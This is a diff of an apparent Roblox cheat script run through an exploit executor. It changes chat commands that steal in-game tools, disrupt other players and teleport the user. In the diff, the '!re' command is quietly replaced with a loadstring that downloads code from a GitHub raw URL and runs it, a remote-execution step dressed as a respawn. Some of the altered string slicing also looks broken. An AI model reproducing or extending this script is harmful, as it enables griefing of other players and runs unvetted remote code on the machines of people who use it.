@@ -877,8 +877,8 @@ TextButton.MouseButton1Down:connect(function()
 	print("\nExecuted.")
 
 	plr.Chatted:connect(function(message)
-		if message:sub(1,3) == "$id" then
-			id = message:sub(5)
+		if message:sub(1,3) == "!id" then
+			id = message:sub(2)
 			local args = message:split(" ")
 
 			for _,v in pairs(plr.Backpack:GetChildren()) do
@@ -895,9 +895,9 @@ TextButton.MouseButton1Down:connect(function()
 			end 
 		end
 
-		if message:sub(1,3) == "$bp" then
+		if message:sub(1,3) == "!bp" then
 
-			id = message:sub(5)
+			id = message:sub(2)
 
 			for _,v in pairs(plr.Backpack:GetChildren()) do
 				if v:IsA("Tool") and string.lower(v.Name) == "boombox" then v.Parent = plr.Character end
@@ -924,11 +924,11 @@ TextButton.MouseButton1Down:connect(function()
 			end
 
 		end
-		if message:sub(1,3) == "$rj" then
+		if message:sub(1,3) == "!rj" then
 			game:GetService("TeleportService"):Teleport(gameid, plr);
 		end
 
-		if message:sub(1,3) == "$tp" then 
+		if message:sub(1,3) == "!tp" then 
 
 			local args = message:split(" ")
 
@@ -945,7 +945,7 @@ TextButton.MouseButton1Down:connect(function()
 			end
 
 		end
-		if message:sub(1,4) == "$tpa" then
+		if message:sub(1,4) == "!tpa" then
 
 			local args = message:split(" ")
 
@@ -964,11 +964,11 @@ TextButton.MouseButton1Down:connect(function()
 			end
 		end
 
-		if message:sub(1,3) == "$re" then
-			charr:BreakJoints()
+		if message:sub(1,3) == "!re" then
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/ware11/dupe1/main/DUPE.GRIPS"))();
 		end
 
-		if message:sub(1,4) == "$off" then
+		if message:sub(1,4) == "!off" then
 			for _,v in pairs(game.Players:GetPlayers()) do
 				if v.Name ~= plr.Name then
 					-- Character
@@ -984,7 +984,7 @@ TextButton.MouseButton1Down:connect(function()
 			end
 		end
 
-		if message:sub(1,5) == "$mute" then
+		if message:sub(1,5) == "!mute" then
 			while wait(.03) do
 				for _,v in pairs(game.Players:GetPlayers()) do
 					if v.Name ~= plr.Name then
@@ -1002,7 +1002,7 @@ TextButton.MouseButton1Down:connect(function()
 			end
 		end
 
-		if message:sub(1,7) == "$steal" then 
+		if message:sub(1,7) == "!steal" then 
 			for _,v in pairs(game.workspace:GetChildren()) do
 				if v:IsA("Tool") then
 					v.Handle.CFrame = plr.Character.Head.CFrame
